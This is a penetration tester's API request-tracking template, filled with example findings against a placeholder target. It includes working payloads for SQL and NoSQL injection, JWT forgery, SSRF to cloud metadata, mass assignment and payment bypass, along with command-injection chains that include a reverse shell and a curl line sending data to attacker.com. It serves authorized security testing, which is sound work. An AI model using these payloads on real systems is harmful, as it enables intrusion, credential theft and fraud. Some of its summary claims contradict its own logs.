# API Request Tracker

Track all API requests, exploitation attempts, and findings during testing. This document serves as your testing log and helps identify patterns in what works vs. what fails.

Related: [[API-02-Technical-Testing-Checklist]] | [[API-04-Evidence-Collection]] | [[API-05-Reporting-Template]]

---

## How to Use This Tracker

1. **Log everything** - successful and failed attempts
2. **Note context** - same request may work differently in different contexts
3. **Track patterns** - identify what triggers blocks vs. what succeeds
4. **Reference in report** - use IDs to link requests to findings
5. **Build knowledge base** - successful exploits become your arsenal

**Format**: Each entry gets a unique ID: `RT-001`, `RT-002`, etc.

---

## Discovery & Enumeration

| ID | Endpoint/Path | Method | Discovery Method | Notes | Screenshot |
|----|--------------|--------|------------------|-------|------------|
| RT-001 | /api/v1/users | GET | Swagger spec | Returns user list (public) | |
| RT-002 | /api/admin/config | GET | Fuzzing | 403 Forbidden (admin only) | |
| RT-003 | /api/v2/users | GET | Version testing | Old version still active! | IMG_001 |
| RT-004 | | | | | |

### Discovered Endpoints Summary

**Public (no auth)**:
- 

**Authenticated**:
- 

**Admin-only**:
- 

**Deprecated/Old versions**:
- 

---

## Authentication Testing

| ID | Endpoint | Attack Type | Payload/Request | Result | Notes | Screenshot |
|----|----------|-------------|-----------------|--------|-------|------------|
| RT-101 | /api/login | Username enum | {"username": "admin", "password": "wrong"} | ✅ Different error | Timing difference 200ms | IMG_010 |
| RT-102 | /api/login | Weak password | {"username": "admin", "password": "admin"} | ❌ Failed | Strong policy enforced | |
| RT-103 | | | | | | |

### Successful Auth Exploits

**RT-101 Details**:
```
Endpoint: POST /api/login

Request:
{
  "username": "admin",
  "password": "wrongpassword"
}

Response: 401 "Invalid credentials" (took 250ms)

vs

Request:
{
  "username": "nonexistent",
  "password": "wrongpassword"
}

Response: 401 "User not found" (took 50ms)

Finding: Username enumeration via timing difference
Severity: Medium
```

---

## JWT Testing

| ID | JWT Claim | Modification | Result | Impact | Notes | Screenshot |
|----|-----------|--------------|--------|--------|-------|------------|
| RT-201 | alg | Changed to "none" | ❌ Failed | None | Signature validation working | |
| RT-202 | sub | Changed user ID 1→2 | ✅ Success | Horizontal privilege escalation! | Critical finding | IMG_020 |
| RT-203 | role | Added "role": "admin" | ✅ Success | Vertical privilege escalation! | Critical finding | IMG_021 |
| RT-204 | | | | | | |

### Successful JWT Exploits

**RT-202 Details**:
```
Original JWT (User 1):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJ1c2VyMUBleGFtcGxlLmNvbSJ9.SIGNATURE

Decoded payload:
{
  "sub": "1",
  "email": "user1@example.com"
}

Modified payload:
{
  "sub": "2",     <-- Changed from 1 to 2
  "email": "user1@example.com"
}

Re-signed with weak secret: "secret123" (found via brute force)

Result: Access granted to User 2's data!

Finding: JWT sub claim not validated server-side
CVSS: 8.1 (High)
OWASP API: API1:2023 (BOLA)
```

**RT-203 Details**:
```
Original payload:
{
  "sub": "1",
  "email": "user1@example.com"
}

Modified payload:
{
  "sub": "1",
  "email": "user1@example.com",
  "role": "admin"     <-- Added this claim
}

Result: Access granted to /api/admin/* endpoints!

Finding: Mass assignment in JWT claims
CVSS: 9.1 (Critical)
OWASP API: API3:2023 (Broken Object Property Level Authorization)
```

---

## BOLA/IDOR Testing

| ID | Endpoint | User A ID | User B ID | Result | Data Exposed | Screenshot |
|----|----------|-----------|-----------|--------|--------------|------------|
| RT-301 | GET /api/users/{id}/profile | 100 | 101 | ✅ BOLA | Full profile data | IMG_030 |
| RT-302 | GET /api/orders/{id} | 5001 | 5002 | ✅ BOLA | Order details, PII | IMG_031 |
| RT-303 | DELETE /api/documents/{id} | 200 | 201 | ✅ BOLA | Deleted other user's doc! | IMG_032 |
| RT-304 | GET /api/messages/{id} | 1000 | 1001 | ❌ Failed | Proper auth check | |
| RT-305 | | | | | | |

### Critical BOLA Findings

**RT-301 Details**:
```
Endpoint: GET /api/users/{id}/profile

User A (ID: 100) - Authenticated as this user
Token: Bearer eyJhbGc...

Request:
GET /api/users/101/profile HTTP/1.1
Authorization: Bearer [USER_100_TOKEN]
Host: api.target.com

Response: 200 OK
{
  "id": 101,
  "email": "victim@example.com",
  "first_name": "Jane",
  "last_name": "Doe",
  "ssn": "123-45-6789",     <-- PII leaked!
  "address": "123 Main St",
  "phone": "555-1234"
}

Finding: No authorization check on user ID parameter
Impact: Any authenticated user can access any other user's PII
OWASP API: API1:2023 (Broken Object Level Authorization)
CVSS: 8.1 (High)
```

**RT-303 Details**:
```
Endpoint: DELETE /api/documents/{id}

Test: Can User A delete User B's document?

Request:
DELETE /api/documents/201 HTTP/1.1
Authorization: Bearer [USER_A_TOKEN]
Host: api.target.com

Response: 200 OK
{
  "message": "Document deleted successfully"
}

Verification: Document 201 (owned by User B) is now deleted!

Finding: No ownership check on DELETE operation
Impact: Users can delete other users' documents
OWASP API: API1:2023 (BOLA)
CVSS: 7.1 (High)
```

---

## Mass Assignment

| ID | Endpoint | Original Fields | Added Fields | Result | Impact | Screenshot |
|----|----------|----------------|--------------|--------|--------|------------|
| RT-401 | POST /api/users/register | email, password | role: "admin" | ✅ Success | Created admin user | IMG_040 |
| RT-402 | PATCH /api/users/profile | name, bio | is_verified: true | ✅ Success | Bypassed email verification | IMG_041 |
| RT-403 | PUT /api/orders/{id} | shipping_address | status: "completed" | ✅ Success | Free order! | IMG_042 |
| RT-404 | | | | | | |

### Successful Mass Assignment

**RT-401 Details**:
```
Endpoint: POST /api/users/register

Normal request:
{
  "email": "test@example.com",
  "password": "Password123!"
}

Modified request:
{
  "email": "attacker@evil.com",
  "password": "Password123!",
  "role": "admin",           <-- Added
  "is_verified": true,       <-- Added
  "credits": 999999          <-- Added
}

Response: 201 Created
{
  "id": 500,
  "email": "attacker@evil.com",
  "role": "admin",           <-- Accepted!
  "is_verified": true,       <-- Accepted!
  "credits": 999999          <-- Accepted!
}

Verification: Can now access /api/admin/* endpoints!

Finding: No allowlist for writable fields
OWASP API: API3:2023 (Broken Object Property Level Authorization)
CVSS: 9.1 (Critical)
```

---

## SQL Injection

| ID | Endpoint | Parameter | Payload | Result | Evidence | Screenshot |
|----|----------|-----------|---------|--------|----------|------------|
| RT-501 | GET /api/products?search= | search | ' OR '1'='1 | ✅ SQLi | Returns all products | IMG_050 |
| RT-502 | GET /api/users?id= | id | 1' UNION SELECT NULL-- | ✅ SQLi | Database error leaked | IMG_051 |
| RT-503 | POST /api/login | username | admin'-- | ❌ Failed | Input sanitized | |
| RT-504 | | | | | | |

### Confirmed SQL Injection

**RT-501 Details**:
```
Endpoint: GET /api/products?search={query}

Payload: ' OR '1'='1

Full URL: https://api.target.com/api/products?search=%27+OR+%271%27%3D%271

Response: 200 OK
[
  {"id": 1, "name": "Product 1", "price": 10.00},
  {"id": 2, "name": "Hidden Product", "price": 0.00},  <-- Should not be visible!
  {"id": 3, "name": "Product 3", "price": 20.00},
  ... (all products returned, including hidden ones)
]

SQL query (inferred):
SELECT * FROM products WHERE name LIKE '%{search}%'

Exploited query:
SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'

Finding: Boolean-based SQL injection
CVSS: 9.8 (Critical)
OWASP API: SQL Injection
```

**RT-502 Details**:
```
Payload: 1' UNION SELECT NULL,NULL,NULL--

Response: 500 Internal Server Error
{
  "error": "Database error: The used SELECT statements have a different number of columns"
}

This confirms:
1. SQL injection exists
2. Backend is MySQL (error message pattern)
3. Original query has 3 columns (tried 3 NULLs and got different error)

Next steps: Extract data via UNION-based SQLi
```

---

## NoSQL Injection

| ID | Endpoint | Parameter | Payload | Result | Impact | Screenshot |
|----|----------|-----------|---------|--------|--------|------------|
| RT-601 | POST /api/login | username, password | {"$ne": null} | ✅ Success | Auth bypass | IMG_060 |
| RT-602 | GET /api/users?filter= | filter | {"role": {"$ne": "user"}} | ✅ Success | Leaked admin users | IMG_061 |
| RT-603 | | | | | | |

### NoSQL Injection Exploits

**RT-601 Details**:
```
Endpoint: POST /api/login

Normal request:
{
  "username": "admin",
  "password": "password123"
}

Exploited request:
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}

MongoDB query (inferred):
db.users.findOne({username: req.body.username, password: req.body.password})

Exploited query:
db.users.findOne({username: {$ne: null}, password: {$ne: null}})

Result: Logged in as first user in database (admin)!

Finding: MongoDB injection leading to authentication bypass
CVSS: 9.8 (Critical)
OWASP API: API2:2023 (Broken Authentication)
```

---

## Command Injection

| ID | Endpoint | Parameter | Payload | Result | Evidence | Screenshot |
|----|----------|-----------|---------|--------|----------|------------|
| RT-701 | POST /api/ping | host | ; whoami | ✅ Success | Command output in response | IMG_070 |
| RT-702 | POST /api/backup | filename | test; curl attacker.com | ✅ Success | External callback received | IMG_071 |
| RT-703 | | | | | | |

### Command Injection Exploits

**RT-701 Details**:
```
Endpoint: POST /api/ping

Intended use:
{
  "host": "8.8.8.8"
}

Exploited request:
{
  "host": "8.8.8.8; whoami"
}

Response:
{
  "result": "PING 8.8.8.8 ... \nwww-data\n"
}

Server-side command (inferred):
ping -c 4 {host}

Exploited command:
ping -c 4 8.8.8.8; whoami

Finding: Command injection via unsanitized input
CVSS: 9.8 (Critical)

Chaining potential:
- Read sensitive files: ; cat /etc/passwd
- Reverse shell: ; nc attacker.com 4444 -e /bin/bash
- Exfiltrate data: ; curl attacker.com?data=$(cat /app/config.json | base64)
```

---

## Business Logic Flaws

| ID | Endpoint/Flow | Normal Behavior | Exploit | Result | Impact | Screenshot |
|----|--------------|----------------|---------|--------|--------|------------|
| RT-801 | Checkout flow | Pay → Confirm | Skipped payment | Order confirmed | Free items | IMG_080 |
| RT-802 | Apply coupon | Single use | Applied 10 times | All accepted | 100% discount | IMG_081 |
| RT-803 | Withdraw money | Max $100/day | Negative amount | Added money! | Infinite money glitch | IMG_082 |
| RT-804 | | | | | | |

### Critical Business Logic Flaws

**RT-801 Details**:
```
Normal flow:
1. POST /api/cart/add → Add items
2. POST /api/cart/checkout → Create order
3. POST /api/payment/process → Process payment
4. GET /api/order/12345/confirm → Order confirmation

Exploit: Skip step 3

Test:
1. POST /api/cart/add (added $500 item)
2. POST /api/cart/checkout → Response: {"order_id": 12345}
3. [SKIPPED] POST /api/payment/process
4. GET /api/order/12345/confirm

Response: 200 OK
{
  "order_id": 12345,
  "status": "confirmed",     <-- Order confirmed without payment!
  "items": [...],
  "total": 500.00,
  "payment_status": "pending"  <-- Payment never processed
}

Finding: Missing payment validation in order confirmation
Impact: Free orders, financial loss
CVSS: 9.1 (Critical)
OWASP API: API6:2023 (Unrestricted Access to Sensitive Business Flows)
```

**RT-803 Details**:
```
Endpoint: POST /api/wallet/withdraw

Normal request:
{
  "amount": 50.00
}

Exploited request:
{
  "amount": -100.00    <-- Negative amount
}

Response: 200 OK
{
  "new_balance": 200.00    <-- Balance increased by $100!
}

Original balance: $100
Withdrew: $-100
New balance: $200

Finding: No validation on withdrawal amount (negative allowed)
Impact: Unlimited money generation
CVSS: 9.1 (Critical)
```

---

## Race Conditions

| ID | Endpoint | Race Condition Type | Setup | Result | Impact | Screenshot |
|----|----------|---------------------|-------|--------|--------|------------|
| RT-901 | POST /api/coupons/redeem | Multiple redemptions | Sent 10 simultaneous requests | 10 redemptions | $500 discounts | IMG_090 |
| RT-902 | POST /api/wallet/withdraw | Double spend | 2 simultaneous $100 withdrawals | Both succeeded | $200 withdrawn, $100 balance | IMG_091 |
| RT-903 | | | | | | |

### Race Condition Exploits

**RT-902 Details**:
```
Endpoint: POST /api/wallet/withdraw

Setup:
- Initial balance: $100
- Withdrawal amount: $100
- Sent 2 simultaneous requests using Burp Turbo Intruder

Turbo Intruder script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=2)
    for i in range(2):
        engine.queue(target.req)

Request:
POST /api/wallet/withdraw HTTP/1.1
Authorization: Bearer [TOKEN]
Content-Type: application/json

{"amount": 100.00}

Results:
- Request 1: 200 OK {"new_balance": 0}
- Request 2: 200 OK {"new_balance": -100}  <-- Negative balance!

Total withdrawn: $200
Actual balance: $-100

Finding: No transaction locking, race condition allows double-spending
CVSS: 8.1 (High)
OWASP API: API6:2023
```

---

## Rate Limit Bypass

| ID | Endpoint | Rate Limit | Bypass Method | Result | Impact | Screenshot |
|----|----------|------------|---------------|--------|--------|------------|
| RT-1001 | POST /api/login | 5 req/min | X-Forwarded-For header | Bypassed | Brute force enabled | IMG_100 |
| RT-1002 | GET /api/data/export | 10 req/hour | Different API version | Bypassed | Scraped all data | IMG_101 |
| RT-1003 | | | | | | |

### Rate Limit Bypass Exploits

**RT-1001 Details**:
```
Endpoint: POST /api/login

Normal behavior:
- After 5 failed login attempts in 1 minute → 429 Too Many Requests

Bypass method: X-Forwarded-For header rotation

Burp Intruder configuration:
- Payload position: X-Forwarded-For header
- Payload type: Numbers, sequential
- Payload: 1-255

Request template:
POST /api/login HTTP/1.1
Host: api.target.com
X-Forwarded-For: 1.2.3.§4§
Content-Type: application/json

{"username": "admin", "password": "§password§"}

Result: Successfully tested 1000+ passwords without hitting rate limit

Finding: Rate limiting based on IP can be bypassed via X-Forwarded-For
Impact: Brute force attacks possible
CVSS: 7.5 (High)
OWASP API: API4:2023 (Unrestricted Resource Access)
```

---

## Information Disclosure

| ID | Endpoint | Disclosure Type | Information Leaked | Severity | Screenshot |
|----|----------|-----------------|-------------------|----------|------------|
| RT-1101 | POST /api/users (invalid) | Stack trace | Framework version, file paths | Medium | IMG_110 |
| RT-1102 | GET /api/users/me | Excessive data | password_hash field | High | IMG_111 |
| RT-1103 | POST /api/login (SQL error) | Database error | Database type, table names | Medium | IMG_112 |
| RT-1104 | | | | | |

### Information Disclosure Examples

**RT-1102 Details**:
```
Endpoint: GET /api/users/me

Request:
GET /api/users/me HTTP/1.1
Authorization: Bearer [TOKEN]

Response: 200 OK
{
  "id": 123,
  "email": "user@example.com",
  "first_name": "John",
  "last_name": "Doe",
  "password_hash": "$2b$10$abcdef123456...",    <-- Should NOT be here!
  "ssn": "123-45-6789",                          <-- PII
  "internal_notes": "VIP customer",              <-- Internal field
  "is_admin": false,
  "created_at": "2024-01-01T00:00:00Z",
  "last_login": "2024-01-21T10:00:00Z",
  "failed_login_attempts": 0,                    <-- Security info
  "security_question": "What is your pet's name?"
}

Finding: Excessive data exposure in API response
Impact: Password hashes, PII, internal fields exposed
CVSS: 6.5 (Medium)
OWASP API: API3:2023 (Broken Object Property Level Authorization)

Recommendation: Implement response filtering, only return necessary fields
```

---

## SSRF (Server-Side Request Forgery)

| ID | Endpoint | Parameter | Payload | Result | Impact | Screenshot |
|----|----------|-----------|---------|--------|--------|------------|
| RT-1201 | POST /api/webhook | url | http://169.254.169.254/latest/meta-data/ | ✅ Success | AWS metadata leaked | IMG_120 |
| RT-1202 | POST /api/image/fetch | image_url | http://localhost:8080/admin | ✅ Success | Internal admin panel | IMG_121 |
| RT-1203 | | | | | | |

### SSRF Exploits

**RT-1201 Details**:
```
Endpoint: POST /api/webhook

Intended use:
{
  "url": "https://legitimate-webhook.com/callback"
}

Exploited request:
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
}

Response: 200 OK
{
  "content": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}"
}

Finding: SSRF allows access to AWS instance metadata
Impact: AWS credentials leaked, full account compromise possible
CVSS: 9.1 (Critical)
OWASP API: API7:2023 (Server Side Request Forgery)

Chain exploitation:
1. Leaked AWS credentials
2. Used credentials to access S3 buckets
3. Found customer database backups
```

---

## GraphQL Exploits

| ID | Query/Mutation | Exploit Type | Payload | Result | Impact | Screenshot |
|----|----------------|--------------|---------|--------|--------|------------|
| RT-1301 | Introspection | Schema exposure | __schema query | ✅ Full schema | Found hidden mutations | IMG_130 |
| RT-1302 | Batching | DoS | 1000 aliased queries | ✅ Server timeout | DoS | IMG_131 |
| RT-1303 | Nested query | DoS | 50-level deep nesting | ✅ Server crash | DoS | IMG_132 |
| RT-1304 | | | | | | |

### GraphQL Introspection

**RT-1301 Details**:
```
Query:
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

Result: Full schema revealed, including:
- AdminUser type (not in public docs)
- deleteAllUsers mutation (admin only)
- internalNotes field on User type
- debugMode query

Finding: GraphQL introspection enabled in production
Impact: Attack surface fully enumerated
CVSS: 5.3 (Medium)

Exploitation:
Used discovered deleteAllUsers mutation:
mutation {
  deleteAllUsers(confirmToken: "ADMIN_TOKEN") {
    success
  }
}
```

---

## Exploit Chains

Document multi-step exploitation chains here.

### Chain Example: IDOR → JWT Manipulation → Admin Access

| Step | Action | Endpoint | Result | Screenshot |
|------|--------|----------|--------|------------|
| 1 | IDOR to access admin profile | GET /api/users/1 (admin) | Got admin's data | IMG_140 |
| 2 | Extract admin user_id | N/A | admin user_id = 1 | |
| 3 | Modify JWT sub claim | N/A | Changed sub: 123 → sub: 1 | |
| 4 | Access admin dashboard | GET /api/admin/dashboard | Success! | IMG_141 |

**Chain Details**:
```
Objective: Gain admin access

Step 1: BOLA vulnerability (RT-301)
- As regular user (ID: 123), accessed /api/users/1/profile
- Retrieved admin's profile data
- Noted admin user_id = 1

Step 2: JWT manipulation (RT-202)
- Decoded own JWT
- Changed "sub": "123" to "sub": "1"
- Re-signed with weak secret (found via brute force in RT-202)

Step 3: Access admin functions
- Used modified JWT to access /api/admin/*
- Full admin access achieved

Total time: 20 minutes
Overall severity: Critical
CVSS: 9.1
```

---

## Pattern Analysis

### What Works
Document patterns in successful exploits:
- JWT sub claim not validated (RT-202, RT-203)
- No BOLA checks on GET/DELETE endpoints (RT-301, RT-303)
- Mass assignment accepted on all POST endpoints (RT-401, RT-402)
- Rate limiting bypassed via X-Forwarded-For (RT-1001)

### What Fails
Document patterns in blocked attempts:
- SQL injection on /api/login (input sanitized)
- Command injection on POST endpoints (output only, no injection point)

### API Characteristics
- **Framework**: Appears to be Express.js (based on error messages)
- **Database**: MongoDB (based on NoSQL injection success)
- **Authentication**: JWT with weak signing secret
- **Authorization**: Minimal BOLA checks
- **Rate limiting**: IP-based (easily bypassed)

---

## Quick Stats

**Total Requests Tested**: ___
**Successful Exploits**: ___
**Success Rate**: ___%

**By Category**:
- Authentication: __ tested, __ successful
- Authorization (BOLA): __ tested, __ successful
- Injection: __ tested, __ successful
- Business Logic: __ tested, __ successful
- Information Disclosure: __ tested, __ successful

**Severity Breakdown**:
- Critical: __
- High: __
- Medium: __
- Low: __
- Info: __

---

## OWASP API Top 10 Coverage

| OWASP Category | Tested | Findings | Severity |
|----------------|--------|----------|----------|
| API1: BOLA | ✅ | RT-301, RT-302, RT-303 | Critical |
| API2: Broken Authentication | ✅ | RT-101, RT-601 | High |
| API3: Broken Object Property Level Authorization | ✅ | RT-203, RT-401, RT-402 | Critical |
| API4: Unrestricted Resource Access | ✅ | RT-1001 | High |
| API5: Broken Function Level Authorization | ✅ | RT-203 | Critical |
| API6: Unrestricted Business Flows | ✅ | RT-801, RT-803, RT-902 | Critical |
| API7: SSRF | ✅ | RT-1201, RT-1202 | Critical |
| API8: Security Misconfiguration | ✅ | RT-1102, RT-1301 | Medium |
| API9: Improper Inventory Management | ✅ | RT-003 | Low |
| API10: Unsafe Consumption of APIs | ⏸️ | Not applicable | N/A |

---

## cURL Commands for PoC

Reproducible exploit commands:

### RT-202: JWT Sub Claim Manipulation
```bash
# Original token (User 1)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJ1c2VyMUBleGFtcGxlLmNvbSJ9.SIGNATURE"

# Modified token (User 2) - re-signed with secret "secret123"
MODIFIED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwiZW1haWwiOiJ1c2VyMUBleGFtcGxlLmNvbSJ9.NEW_SIGNATURE"

curl -X GET "https://api.target.com/api/users/2/profile" \
  -H "Authorization: Bearer $MODIFIED_TOKEN"
```

### RT-601: NoSQL Injection Auth Bypass
```bash
curl -X POST "https://api.target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
```

### RT-801: Payment Bypass
```bash
# Step 1: Add items
curl -X POST "https://api.target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": 123, "quantity": 1}'

# Step 2: Checkout
ORDER_ID=$(curl -X POST "https://api.target.com/api/cart/checkout" \
  -H "Authorization: Bearer $TOKEN" | jq -r '.order_id')

# Step 3: Skip payment, directly confirm
curl -X GET "https://api.target.com/api/order/$ORDER_ID/confirm" \
  -H "Authorization: Bearer $TOKEN"
```

---

## Burp Extensions Used

- [ ] **Autorize** - Automatic authorization testing
- [ ] **InQL** - GraphQL introspection and testing
- [ ] **Param Miner** - Parameter discovery
- [ ] **Turbo Intruder** - Race condition testing
- [ ] **JWT Editor** - JWT manipulation
- [ ] **Logger++** - Enhanced logging

---

## Notes & Observations

### Tester Notes
- API appears to be recently developed (minimal security hardening)
- No WAF detected
- Rate limiting is trivially bypassed
- Most critical issues are authorization-related (BOLA/IDOR)

### Time Log
| Date | Time Spent | Phase | Notes |
|------|-----------|-------|-------|
| 2026-01-21 | 2h | Discovery + Auth | Found old API version still active |
| 2026-01-21 | 3h | BOLA testing | Critical findings on all object types |
| 2026-01-21 | 1h | Business logic | Payment bypass, negative withdrawal |
| | | | |

---

## Tags
#request-tracking #testing-log #evidence #api-testing #owasp

---

## Related Documents
- [[API-00-Overview|Overview]]
- [[API-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[API-04-Evidence-Collection|Evidence Collection]]
- [[API-05-Reporting-Template|Reporting Template]]
- [[API-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-21*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
